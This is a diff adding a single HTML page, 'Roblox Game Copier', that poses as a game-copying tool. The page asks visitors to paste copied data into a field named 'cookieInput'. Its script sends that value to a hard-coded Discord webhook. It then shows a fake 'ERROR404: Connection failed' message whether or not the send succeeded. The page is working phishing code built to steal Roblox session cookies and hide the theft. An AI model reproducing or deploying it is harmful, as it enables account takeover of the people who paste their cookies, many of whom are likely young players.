@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Game Copier</title>
+    <style>
+        body {
+            background: #000000;
+            color: white;
+            font-family: Arial;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            margin: 100px auto;
+            padding: 40px;
+            max-width: 500px;
+        }
+        input {
+            padding: 15px;
+            margin: 10px;
+            width: 300px;
+            background: #1a1a1a;
+            color: white;
+            border: 1px solid #333;
+            border-radius: 5px;
+        }
+        button {
+            padding: 15px 30px;
+            background: #00ff88;
+            color: black;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        #message {
+            color: #ff4444;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Roblox Game Copier</h1>
+        <p>Paste what you copied</p>
+        
+        <input type="text" id="cookieInput" placeholder="Paste here">
+        <br>
+        <button onclick="sendToDiscord()">Start Copying</button>
+        <p id="message"></p>
+    </div>
+
+    <script>
+        function sendToDiscord() {
+            var data = document.getElementById('cookieInput').value;
+            var msg = document.getElementById('message');
+            
+            msg.innerHTML = "Loading...";
+            msg.style.color = "#00ff88";
+            
+            // Создаем форму как в рабочем сайте
+            var formData = new FormData();
+            formData.append('content', data);
+            
+            fetch('https://discord.com/api/webhooks/1435910212690247811/OS9jd1UQJL8oNUNCf8ENJLi8zkO_0oeN5MrcdlgPgeIDYl7mkNZZcD6xpSitGqLCElRe', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    setTimeout(function() {
+                        msg.innerHTML = "ERROR404: Connection failed";
+                        msg.style.color = "#ff4444";
+                    }, 5000);
+                }
+            })
+            .catch(error => {
+                setTimeout(function() {
+                    msg.innerHTML = "ERROR404: Connection failed";
+                    msg.style.color = "#ff4444";
+                }, 3000);
+            });
+        }
+    </script>
+</body>
+</html>
